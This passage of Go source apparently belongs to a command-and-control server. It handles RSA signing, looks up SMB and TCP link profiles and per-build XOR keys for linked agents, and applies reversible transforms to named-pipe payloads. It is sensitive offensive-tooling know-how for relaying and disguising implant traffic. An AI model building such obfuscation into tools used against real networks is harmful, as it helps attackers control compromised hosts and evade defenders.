	// First, base64 decode to get the PEM data (matches handler_handshake.go pattern)
	pemData, err := base64.StdEncoding.DecodeString(rsaKeyBase64)
	if err != nil {
		// If base64 decode fails, try treating it as raw PEM
		pemData = []byte(rsaKeyBase64)
	}

	// Parse PEM block
	block, _ := pem.Decode(pemData)
	if block == nil {
		return nil, fmt.Errorf("failed to parse PEM block from RSA key")
	}

	// Parse private key (PKCS1 format)
	privateKey, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		// Try PKCS8 as fallback
		key, err := x509.ParsePKCS8PrivateKey(block.Bytes)
		if err != nil {
			return nil, fmt.Errorf("failed to parse private key: %w", err)
		}
		var ok bool
		privateKey, ok = key.(*rsa.PrivateKey)
		if !ok {
			return nil, fmt.Errorf("key is not RSA private key")
		}
	}

	// Sign with PKCS1v15
	signature, err := rsa.SignPKCS1v15(rand.Reader, privateKey, crypto.SHA256, data)
	if err != nil {
		return nil, fmt.Errorf("failed to sign: %w", err)
	}

	return signature, nil
}

// =============================================================================
// LINK TRANSFORM HELPERS
// =============================================================================

// getLinkTypeForAgent returns the link type (smb or tcp) for a linked agent
func (m *Manager) getLinkTypeForAgent(linkedClientID string) string {
	var linkType sql.NullString
	err := m.db.QueryRow(`
		SELECT link_type FROM link_routing
		WHERE linked_clientID = $1 AND status = 'active'
		LIMIT 1`,
		linkedClientID).Scan(&linkType)

	if err != nil || !linkType.Valid || linkType.String == "" {
		// Default to SMB for backwards compatibility
		return "smb"
	}
	return linkType.String
}

// getProfileForAgent returns the transform profile for a linked agent (SMB or TCP)
func (m *Manager) getProfileForAgent(linkedClientID string) *config.SMBProfile {
	linkType := m.getLinkTypeForAgent(linkedClientID)
	if linkType == "tcp" {
		return m.getTCPProfileForAgent(linkedClientID)
	}
	return m.getSMBProfileForAgent(linkedClientID)
}

// getXorKeyForAgent returns the XOR key for a linked agent (SMB or TCP)
func (m *Manager) getXorKeyForAgent(linkedClientID string) string {
	linkType := m.getLinkTypeForAgent(linkedClientID)
	if linkType == "tcp" {
		return m.getTCPXorKeyForAgent(linkedClientID)
	}
	return m.getSMBXorKeyForAgent(linkedClientID)
}

// getTCPProfileForAgent returns the TCP profile to use for a linked agent
func (m *Manager) getTCPProfileForAgent(linkedClientID string) *config.SMBProfile {
	if m.linkRouting == nil || m.linkRouting.config == nil {
		return nil
	}

	// Look up the TCP profile name from the link_routing table
	var profileName sql.NullString
	err := m.db.QueryRow(`
		SELECT tcp_profile FROM link_routing
		WHERE linked_clientID = $1 AND status = 'active'
		LIMIT 1`,
		linkedClientID).Scan(&profileName)

	if err != nil || !profileName.Valid || profileName.String == "" {
		return nil
	}

	profile := m.linkRouting.config.GetSMBProfile(profileName.String)
	return profile
}

// getTCPXorKeyForAgent returns the per-build XOR key for a TCP linked agent
func (m *Manager) getTCPXorKeyForAgent(linkedClientID string) string {
	// Try link_routing table first (for connected TCP agents)
	var xorKey sql.NullString
	err := m.db.QueryRow(`
		SELECT tcp_xor_key FROM link_routing
		WHERE linked_clientID = $1 AND status = 'active'
		LIMIT 1`,
		linkedClientID).Scan(&xorKey)

	if err == nil && xorKey.Valid && xorKey.String != "" {
		return xorKey.String
	}

	// Fall back to inits table via connections lookup
	err = m.db.QueryRow(`
		SELECT i.tcp_xor_key FROM inits i
		INNER JOIN connections c ON c.clientID = i.clientID::text
		WHERE c.newclientID = $1`,
		linkedClientID).Scan(&xorKey)

	if err == nil && xorKey.Valid && xorKey.String != "" {
		return xorKey.String
	}

	return ""
}

// getSMBProfileForAgent returns the SMB profile to use for a linked agent
func (m *Manager) getSMBProfileForAgent(linkedClientID string) *config.SMBProfile {
	if m.linkRouting == nil || m.linkRouting.config == nil {
		return nil
	}

	// Look up the SMB profile name from the link_routing table
	var profileName sql.NullString
	err := m.db.QueryRow(`
		SELECT smb_profile FROM link_routing
		WHERE linked_clientID = $1 AND status = 'active'
		LIMIT 1`,
		linkedClientID).Scan(&profileName)

	if err != nil || !profileName.Valid || profileName.String == "" {
		return nil
	}

	profile := m.linkRouting.config.GetSMBProfile(profileName.String)
	return profile
}

// getSMBXorKeyForAgent returns the per-build XOR key for a linked agent
func (m *Manager) getSMBXorKeyForAgent(linkedClientID string) string {
	// Try link_routing table first (for connected SMB agents)
	var xorKey sql.NullString
	err := m.db.QueryRow(`
		SELECT smb_xor_key FROM link_routing
		WHERE linked_clientID = $1 AND status = 'active'
		LIMIT 1`,
		linkedClientID).Scan(&xorKey)

	if err == nil && xorKey.Valid && xorKey.String != "" {
		return xorKey.String
	}

	// Fall back to inits table via connections lookup
	err = m.db.QueryRow(`
		SELECT i.smb_xor_key FROM inits i
		INNER JOIN connections c ON c.clientID = i.clientID::text
		WHERE c.newclientID = $1`,
		linkedClientID).Scan(&xorKey)

	if err == nil && xorKey.Valid && xorKey.String != "" {
		return xorKey.String
	}

	return ""
}

// overrideXorValue replaces XOR transform values with agent-specific key
func overrideXorValue(xforms []transforms.Transform, xorKey string) []transforms.Transform {
	if xorKey == "" {
		return xforms
	}

	// Create copy with overridden XOR values
	result := make([]transforms.Transform, len(xforms))
	for i, t := range xforms {
		result[i] = t
		if t.Type == transforms.TransformXOR {
			result[i].Value = xorKey
		}
	}
	return result
}

// applyPipeTransforms wraps the payload in a JSON envelope and applies SMB transforms
// Returns the transformed data and padding lengths for reversal
// xorKeyOverride: if non-empty, replaces any XOR transform values
func applyPipeTransforms(payload string, profile *config.SMBProfile, xorKeyOverride string) ([]byte, int, int, error) {
	// Create JSON envelope that will be written to the pipe
	envelope := map[string]string{
		"type":    "data",
		"payload": payload,
	}
	envelopeJSON, err := json.Marshal(envelope)
	if err != nil {
		return nil, 0, 0, fmt.Errorf("failed to marshal pipe envelope: %w", err)
	}

	// If no profile or no transforms, return the JSON as-is
	if profile == nil || profile.Data == nil || len(profile.Data.Transforms) == 0 {
		return envelopeJSON, 0, 0, nil
	}

	// Apply transforms
	xforms := convertConfigTransforms(profile.Data.Transforms)

	// Override XOR values if agent has a unique key
	if xorKeyOverride != "" {
		xforms = overrideXorValue(xforms, xorKeyOverride)
	}

	result, err := transforms.Apply(envelopeJSON, xforms)
	if err != nil {
		return nil, 0, 0, fmt.Errorf("failed to apply SMB transforms: %w", err)
	}

	return result.Data, result.PrependLength, result.AppendLength, nil
}

// reversePipeTransforms reverses SMB transforms and extracts the JSON envelope payload
// xorKeyOverride: if non-empty, replaces any XOR transform values
func reversePipeTransforms(data []byte, profile *config.SMBProfile, prependLen, appendLen int, xorKeyOverride string) (string, error) {
	// If no profile or no transforms, parse JSON directly
	if profile == nil || profile.Data == nil || len(profile.Data.Transforms) == 0 {
		var envelope struct {
			Type    string `json:"type"`
			Payload string `json:"payload"`
		}
		if err := json.Unmarshal(data, &envelope); err != nil {
			return "", fmt.Errorf("failed to parse pipe envelope: %w", err)
		}
		return envelope.Payload, nil
	}

	// Reverse transforms
	xforms := convertConfigTransforms(profile.Data.Transforms)

	// Override XOR values if agent has a unique key
	if xorKeyOverride != "" {
		xforms = overrideXorValue(xforms, xorKeyOverride)
	}

	reversed, err := transforms.Reverse(data, xforms, prependLen, appendLen)
	if err != nil {
		return "", fmt.Errorf("failed to reverse SMB transforms: %w", err)
	}

	// Parse the JSON envelope
	var envelope struct {
		Type    string `json:"type"`
		Payload string `json:"payload"`
	}
	if err := json.Unmarshal(reversed, &envelope); err != nil {
		return "", fmt.Errorf("failed to parse reversed pipe envelope: %w", err)
	}

	return envelope.Payload, nil
}
